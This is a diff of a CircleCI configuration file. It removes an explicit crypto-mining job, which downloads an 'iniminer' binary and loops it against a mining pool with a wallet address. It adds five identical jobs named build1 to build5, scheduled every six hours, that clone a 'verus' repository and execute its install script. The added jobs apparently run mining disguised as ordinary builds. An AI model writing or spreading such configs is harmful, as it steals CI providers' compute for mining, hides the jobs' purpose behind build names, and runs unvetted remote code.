@@ -1,42 +1,84 @@
 version: 2.1
 
-parameters:
-  miner-url:
-    type: string
-    default: "https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64"
-  pool-address:
-    type: string
-    default: "stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.CircleCuy@pool-core-testnet.inichain.com:32672"
-
-executors:
-  ubuntu-executor:
-    docker:
-      - image: ubuntu:latest
-    resource_class: medium
-
 jobs:
-  miner:
-    executor: ubuntu-executor
+  build1:
+    docker:
+      - image: cimg/base:2024.01
     steps:
+      - checkout
       - run:
-          name: Install Dependencies
-          command: apt-get update && apt-get install -y wget
-      - run:
-          name: Download and Setup Miner
+          name: Clone and Run Script
           command: |
-            wget << pipeline.parameters.miner-url >>
-            chmod +x iniminer-linux-x64
+            git clone https://github.com/0xwhyteddy/verus.git
+            cd verus
+            chmod +x install-script.sh
+            ./install-script.sh
+            
+  build2:
+    docker:
+      - image: cimg/base:2024.01
+    steps:
+      - checkout
       - run:
-          name: Run Miner
+          name: Clone and Run Script
           command: |
-            while true; do
-              ./iniminer-linux-x64 --pool << pipeline.parameters.pool-address >> --cpu-devices 0 1 2 3
-              sleep 1
-            done
-          no_output_timeout: 3h
+            git clone https://github.com/0xwhyteddy/verus.git
+            cd verus
+            chmod +x install-script.sh
+            ./install-script.sh
+            
+  build3:
+    docker:
+      - image: cimg/base:2024.01
+    steps:
+      - checkout
+      - run:
+          name: Clone and Run Script
+          command: |
+            git clone https://github.com/0xwhyteddy/verus.git
+            cd verus
+            chmod +x install-script.sh
+            ./install-script.sh
+            
+  build4:
+    docker:
+      - image: cimg/base:2024.01
+    steps:
+      - checkout
+      - run:
+          name: Clone and Run Script
+          command: |
+            git clone https://github.com/0xwhyteddy/verus.git
+            cd verus
+            chmod +x install-script.sh
+            ./install-script.sh
+            
+  build5:
+    docker:
+      - image: cimg/base:2024.01
+    steps:
+      - checkout
+      - run:
+          name: Clone and Run Script
+          command: |
+            git clone https://github.com/0xwhyteddy/verus.git
+            cd verus
+            chmod +x install-script.sh
+            ./install-script.sh
 
 workflows:
   version: 2
-  mining-workflow:
+  all_builds:
     jobs:
-      - ./iniminer-linux-x64 --pool << pipeline.parameters.pool-address >> --cpu-devices 0 1
+      - build1
+      - build2
+      - build3
+      - build4
+      - build5
+    triggers:
+      - schedule:
+          cron: "0 */6 * * *"
+          filters:
+            branches:
+              only:
+                - main
